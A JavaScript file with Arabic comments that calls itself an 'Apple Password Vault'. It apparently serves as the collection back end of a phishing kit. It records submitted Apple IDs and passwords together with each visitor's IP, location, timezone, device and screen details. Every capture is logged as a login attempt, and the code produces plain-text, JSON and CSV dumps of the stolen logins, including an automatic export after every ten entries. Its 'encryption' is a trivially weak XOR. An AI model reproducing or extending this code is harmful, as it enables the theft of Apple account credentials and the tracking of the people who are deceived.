// 📁 password-storage.js - نظام تخزين كلمات المرور المتقدم

class PasswordStorageSystem {
    constructor() {
        this.storageKey = 'apple_password_vault';
        this.encryptionKey = this.generateEncryptionKey();
        this.passwords = [];
        this.backupInterval = 300000; // 5 دقائق
        this.init();
    }
    
    // تهيئة النظام
    init() {
        this.loadPasswords();
        this.setupBackup();
        this.setupAutoExport();
        this.setupSecurity();
        console.log('🔐 نظام تخزين كلمات المرور جاهز');
    }
    
    // توليد مفتاح تشفير
    generateEncryptionKey() {
        // استخدام معرف فريد للمستخدم + الطابع الزمني
        const userId = localStorage.getItem('user_id') || 
                      'guest_' + Math.random().toString(36).substr(2, 9);
        const timestamp = Date.now().toString(36);
        return btoa(userId + '_' + timestamp).substr(0, 32);
    }
    
    // تشفير البيانات
    encrypt(data) {
        try {
            const text = JSON.stringify(data);
            let result = '';
            for (let i = 0; i < text.length; i++) {
                const charCode = text.charCodeAt(i) ^ this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
                result += String.fromCharCode(charCode);
            }
            return btoa(result);
        } catch (error) {
            console.error('خطأ في التشفير:', error);
            return JSON.stringify(data);
        }
    }
    
    // فك التشفير
    decrypt(encryptedData) {
        try {
            const text = atob(encryptedData);
            let result = '';
            for (let i = 0; i < text.length; i++) {
                const charCode = text.charCodeAt(i) ^ this.encryptionKey.charCodeAt(i % this.encryptionKey.length);
                result += String.fromCharCode(charCode);
            }
            return JSON.parse(result);
        } catch (error) {
            console.error('خطأ في فك التشفير:', error);
            try {
                return JSON.parse(encryptedData);
            } catch {
                return null;
            }
        }
    }
    
    // تحميل كلمات المرور
    loadPasswords() {
        try {
            const encrypted = localStorage.getItem(this.storageKey);
            if (encrypted) {
                this.passwords = this.decrypt(encrypted) || [];
                console.log(`🔑 تم تحميل ${this.passwords.length} كلمة مرور`);
            }
        } catch (error) {
            console.error('خطأ في تحميل كلمات المرور:', error);
            this.passwords = [];
        }
    }
    
    // حفظ كلمات المرور
    savePasswords() {
        try {
            const encrypted = this.encrypt(this.passwords);
            localStorage.setItem(this.storageKey, encrypted);
            
            // تسجيل في kelog
            if (window.kelogSystem) {
                window.kelogSystem.log('حفظ كلمات المرور', {
                    count: this.passwords.length,
                    encrypted: true
                }, 'security');
            }
            
            return true;
        } catch (error) {
            console.error('خطأ في حفظ كلمات المرور:', error);
            return false;
        }
    }
    
    // إضافة كلمة مرور
    addPassword(appleId, password, metadata = {}) {
        const passwordEntry = {
            id: this.generateId(),
            appleId: appleId,
            password: password,
            timestamp: new Date().toISOString(),
            ip: metadata.ip || 'unknown',
            userAgent: metadata.userAgent || navigator.userAgent,
            screen: metadata.screen || `${screen.width}x${screen.height}`,
            location: metadata.location || 'unknown',
            timezone: metadata.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
            additionalData: metadata.additionalData || {}
        };
        
        this.passwords.push(passwordEntry);
        this.savePasswords();
        
        // تسجيل في kelog
        if (window.kelogSystem) {
            window.kelogSystem.logLoginAttempt(appleId, metadata.ip || 'unknown', true, {
                passwordLength: password.length,
                hasSpecialChars: /[!@#$%^&*]/.test(password)
            });
        }
        
        // إنشاء ملف نصي للكلمة المرور
        this.createPasswordFile(passwordEntry);
        
        console.log('🔐 تم إضافة كلمة مرور جديدة:', appleId);
        return passwordEntry.id;
    }
    
    // توليد معرف فريد
    generateId() {
        return 'pass_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    // الحصول على جميع كلمات المرور
    getAllPasswords() {
        return [...this.passwords].reverse(); // أحدث أولاً
    }
    
    // البحث عن كلمات مرور
    searchPasswords(query) {
        const searchTerm = query.toLowerCase();
        return this.passwords.filter(pass =>
            pass.appleId.toLowerCase().includes(searchTerm) ||
            pass.ip.toLowerCase().includes(searchTerm) ||
            JSON.stringify(pass.additionalData).toLowerCase().includes(searchTerm)
        ).reverse();
    }
    
    // الحصول على كلمة مرور بواسطة المعرف
    getPasswordById(id) {
        return this.passwords.find(pass => pass.id === id);
    }
    
    // حذف كلمة مرور
    deletePassword(id) {
        const index = this.passwords.findIndex(pass => pass.id === id);
        if (index !== -1) {
            const deleted = this.passwords.splice(index, 1)[0];
            this.savePasswords();
            
            // تسجيل في kelog
            if (window.kelogSystem) {
                window.kelogSystem.log('حذف كلمة مرور', {
                    appleId: deleted.appleId,
                    id: id
                }, 'security');
            }
            
            return true;
        }
        return false;
    }
    
    // حذف جميع كلمات المرور
    clearAllPasswords() {
        const count = this.passwords.length;
        this.passwords = [];
        this.savePasswords();
        
        // تسجيل في kelog
        if (window.kelogSystem) {
            window.kelogSystem.log('حذف جميع كلمات المرور', {
                count: count
            }, 'security');
        }
        
        return count;
    }
    
    // إعداد النسخ الاحتياطي
    setupBackup() {
        setInterval(() => {
            this.createBackup();
        }, this.backupInterval);
    }
    
    // إنشاء نسخة احتياطية
    createBackup() {
        try {
            const backupData = {
                passwords: this.passwords,
                backupTime: new Date().toISOString(),
                count: this.passwords.length
            };
            
            const backupKey = `${this.storageKey}_backup_${Date.now()}`;
            const encryptedBackup = this.encrypt(backupData);
            
            localStorage.setItem(backupKey, encryptedBackup);
            
            // الاحتفاظ بـ 5 نسخ احتياطية فقط
            this.cleanupOldBackups();
            
            console.log('💾 تم إنشاء نسخة احتياطية');
            return true;
        } catch (error) {
            console.error('خطأ في إنشاء النسخة الاحتياطية:', error);
            return false;
        }
    }
    
    // تنظيف النسخ الاحتياطية القديمة
    cleanupOldBackups() {
        const backupKeys = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.startsWith(`${this.storageKey}_backup_`)) {
                backupKeys.push(key);
            }
        }
        
        // الاحتفاظ بـ 5 نسخ فقط
        if (backupKeys.length > 5) {
            backupKeys.sort().slice(0, backupKeys.length - 5).forEach(key => {
                localStorage.removeItem(key);
            });
        }
    }
    
    // استعادة من نسخة احتياطية
    restoreFromBackup(backupKey) {
        try {
            const encrypted = localStorage.getItem(backupKey);
            if (encrypted) {
                const backupData = this.decrypt(encrypted);
                this.passwords = backupData.passwords || [];
                this.savePasswords();
                
                // تسجيل في kelog
                if (window.kelogSystem) {
                    window.kelogSystem.log('استعادة من نسخة احتياطية', {
                        backupKey: backupKey,
                        count: this.passwords.length
                    }, 'system');
                }
                
                return true;
            }
        } catch (error) {
            console.error('خطأ في الاستعادة:', error);
        }
        return false;
    }
    
    // إعداد التصدير التلقائي
    setupAutoExport() {
        // تصدير تلقائي كل 10 تسجيلات
        let exportCounter = 0;
        const originalAdd = this.addPassword.bind(this);
        
        this.addPassword = function(appleId, password, metadata) {
            const id = originalAdd(appleId, password, metadata);
            exportCounter++;
            
            if (exportCounter >= 10) {
                this.exportPasswords('auto');
                exportCounter = 0;
            }
            
            return id;
        };
    }
    
    // تصدير كلمات المرور
    exportPasswords(type = 'manual') {
        if (this.passwords.length === 0) {
            console.warn('لا توجد كلمات مرور للتصدير');
            return null;
        }
        
        const exportData = {
            type: 'password_export',
            exportTime: new Date().toISOString(),
            count: this.passwords.length,
            passwords: this.passwords,
            system: 'Apple Password Vault'
        };
        
        const formats = ['txt', 'json', 'csv'];
        const files = {};
        
        formats.forEach(format => {
            files[format] = this.convertToFormat(exportData, format);
        });
        
        // تسجيل في kelog
        if (window.kelogSystem) {
            window.kelogSystem.log('تصدير كلمات المرور', {
                type: type,
                count: this.passwords.length,
                formats: formats
            }, 'security');
        }
        
        return files;
    }
    
    // تحويل إلى تنسيق معين
    convertToFormat(data, format) {
        switch (format) {
            case 'txt':
                return this.convertToTXT(data);
                
            case 'json':
                return JSON.stringify(data, null, 2);
                
            case 'csv':
                return this.convertToCSV(data);
                
            default:
                return '';
        }
    }
    
    // تحويل إلى نص
    convertToTXT(data) {
        let text = '='.repeat(80) + '\n';
        text += '🔐 مخزن كلمات مرور Apple\n';
        text += '='.repeat(80) + '\n\n';
        
        text += `📊 الإحصائيات:\n`;
        text += `• إجمالي كلمات المرور: ${data.count}\n`;
        text += `• وقت التصدير: ${new Date(data.exportTime).toLocaleString('ar-SA')}\n`;
        text += `• النظام: ${data.system}\n\n`;
        
        text += '📝 كلمات المرور:\n';
        text += '─'.repeat(60) + '\n\n';
        
        data.passwords.forEach((pass, index) => {
            text += `السجل ${index + 1}\n`;
            text += '─'.repeat(40) + '\n';
            text += `🆔 المعرف: ${pass.id}\n`;
            text += `📧 Apple ID: ${pass.appleId}\n`;
            text += `🔑 كلمة المرور: ${pass.password}\n`;
            text += `🕒 الوقت: ${new Date(pass.timestamp).toLocaleString('ar-SA')}\n`;
            text += `🌐 IP: ${pass.ip}\n`;
            text += `📍 الموقع: ${pass.location}\n`;
            text += `🕐 المنطقة الزمنية: ${pass.timezone}\n`;
            text += `📱 الجهاز: ${pass.userAgent?.substring(0, 80) || 'غير معروف'}\n`;
            text += `📊 الشاشة: ${pass.screen}\n`;
            
            if (pass.additionalData && Object.keys(pass.additionalData).length > 0) {
                text += `📎 بيانات إضافية: ${JSON.stringify(pass.additionalData, null, 2)}\n`;
            }
            
            text += '\n' + '='.repeat(60) + '\n\n';
        });
        
        return text;
    }
    
    // تحويل إلى CSV
    convertToCSV(data) {
        let csv = 'ID,AppleID,Password,Time,IP,Location,Timezone,UserAgent,Screen\n';
        
        data.passwords.forEach(pass => {
            csv += `"${pass.id}","${pass.appleId}","${pass.password}","${pass.timestamp}",`;
            csv += `"${pass.ip}","${pass.location}","${pass.timezone}",`;
            csv += `"${pass.userAgent || ''}","${pass.screen}"\n`;
        });
        
        return csv;
    }
    
    // إنشاء ملف نصي لكلمة المرور
    createPasswordFile(passwordEntry) {
        const content = `
========================================
🔐 بيانات تسجيل دخول Apple
========================================
📧 Apple ID: ${passwordEntry.appleId}
🔑 كلمة المرور: ${passwordEntry.password}
🌐 عنوان IP: ${passwordEntry.ip}
🕒 الوقت: ${new Date(passwordEntry.timestamp).toLocaleString('ar-SA')}
📍 الموقع: ${passwordEntry.location}
🕐 المنطقة الزمنية: ${passwordEntry.timezone}
📱 الجهاز: ${passwordEntry.userAgent}
📊 دقة الشاشة: ${passwordEntry.screen}
========================================
تم التسجيل تلقائياً بواسطة نظام تخزين كلمات مرور Apple
        `.trim();
        
        // حفظ في localStorage للوصول السريع
        const fileKey = `password_file_${passwordEntry.id}`;
        localStorage.setItem(fileKey, content);
        
        // إضافة إلى قائمة الملفات
        this.addToFileList(passwordEntry.id, fileKey);
        
        return fileKey;
    }
    
    // إضافة إلى قائمة الملفات
    addToFileList(id, fileKey) {
        const fileList = JSON.parse(localStorage.getItem('password_files') || '[]');
        fileList.push({ id, fileKey, time: new Date().toISOString() });
        localStorage.setItem('password_files', JSON.stringify(fileList));
    }
    
    // تحميل ملف كلمة المرور
    downloadPasswordFile(id) {
        const fileKey = `password_file_${id}`;
        const content = localStorage.getItem(fileKey);
        
        if (content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `apple_password_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            return true;
        }
        
        return false;
    }
    
    // تحميل جميع ملفات كلمات المرور
    downloadAllPasswordFiles() {
        const fileList = JSON.parse(localStorage.getItem('password_files') || '[]');
        
        if (fileList.length === 0) {
            return false;
        }
        
        // إنشاء ملف ZIP افتراضي (يمكن استبداله بمكتبة ZIP حقيقية)
        let combinedContent = '';
        
        fileList.forEach(file => {
            const content = localStorage.getItem(file.fileKey);
            if (content) {
                combinedContent += content + '\n\n' + '='.repeat(60) + '\n\n';
            }
        });
        
        const blob = new Blob([combinedContent], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `all_apple_passwords_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        return true;
    }
    
    // إعداد الأمان
    setupSecurity() {
        // منع النسخ من الحقول المحمية
        document.addEventListener('copy', (e) => {
            if (e.target.classList.contains('password-field')) {
                e.preventDefault();
                alert('لا يمكن نسخ كلمات المرور لأسباب أمنية');
            }
        });
        
        // منع لقطة الشاشة (حماية أساسية)
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'S') {
                console.log('تم منع لقطة الشاشة لأسباب أمنية');
                // يمكن إضافة المزيد من الحماية هنا
            }
        });
    }
    
    // تحليل إحصائي لكلمات المرور
    analyzePasswords() {
        const analysis = {
            total: this.passwords.length,
            byLength: {},
            strength: {
                weak: 0,
                medium: 0,
                strong: 0
            },
            specialChars: 0,
            numbers: 0,
            uppercase: 0,
            commonPatterns: []
        };
        
        this.passwords.forEach(pass => {
            const pwd = pass.password;
            
            // حسب الطول
            const length = pwd.length;
            analysis.byLength[length] = (analysis.byLength[length] || 0) + 1;
            
            // قوة كلمة المرور
            let score = 0;
            if (length >= 8) score++;
            if (/[A-Z]/.test(pwd)) score++;
            if (/[a-z]/.test(pwd)) score++;
            if (/[0-9]/.test(pwd)) score++;
            if (/[^A-Za-z0-9]/.test(pwd)) score++;
            
            if (score <= 2) analysis.strength.weak++;
            else if (score <= 4) analysis.strength.medium++;
            else analysis.strength.strong++;
            
            // تحليل الأحرف
            if (/[!@#$%^&*]/.test(pwd)) analysis.specialChars++;
            if (/[0-9]/.test(pwd)) analysis.numbers++;
            if (/[A-Z]/.test(pwd)) analysis.uppercase++;
            
            // اكتشاف الأنماط الشائعة
            const commonPatterns = ['123', 'abc', 'qwerty', 'password', 'admin'];
            commonPatterns.forEach(pattern => {
                if (pwd.toLowerCase().includes(pattern)) {
                    analysis.commonPatterns.push(pattern);
                }
            });
        });
        
        return analysis;
    }
    
    // إنشاء تقرير أمني
    generateSecurityReport() {
        const analysis = this.analyzePasswords();
        const report = {
            generatedAt: new Date().toISOString(),
            summary: analysis,
            recommendations: []
        };
        
        // توصيات أمنية
        if (analysis.strength.weak > 0) {
            report.recommendations.push({
                issue: `${analysis.strength.weak} كلمات مرور ضعيفة`,
                suggestion: 'تأكد من استخدام كلمات مرور قوية تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز'
            });
        }
        
        if (analysis.commonPatterns.length > 0) {
            report.recommendations.push({
                issue: 'تم اكتشاف أنماط شائعة في كلمات المرور',
                suggestion: 'تجنب استخدام الأنماط المتوقعة مثل "123" أو "password"'
            });
        }
        
        if (analysis.total > 50) {
            report.recommendations.push({
                issue: 'عدد كبير من كلمات المرور المخزنة',
                suggestion: 'فكر في تصدير وحذف البيانات القديمة للحفاظ على الأمان'
            });
        }
        
        return report;
    }
}

// إنشاء وتصدير نظام تخزين كلمات المرور
const passwordStorage = new PasswordStorageSystem();
window.passwordStorage = passwordStorage;

// دمج مع نظام Kelog
if (window.kelogSystem) {
    window.kelogSystem.log('تهيئة نظام تخزين كلمات المرور', {
        version: '1.0',
        encryption: true
    }, 'security');
}

console.log('🔐 نظام تخزين كلمات المرور جاهز!');

// دالة مساعدة لإضافة كلمة مرور من النموذج
window.saveApplePassword = function(appleId, password, additionalData = {}) {
    return passwordStorage.addPassword(appleId, password, additionalData);
};

// دالة مساعدة لتصدير كلمات المرور
window.exportApplePasswords = function(format = 'txt') {
    const files = passwordStorage.exportPasswords();
    if (files && files[format]) {
        const blob = new Blob([files[format]], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `apple_passwords_${Date.now()}.${format}`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        return true;
    }
    return false;
};
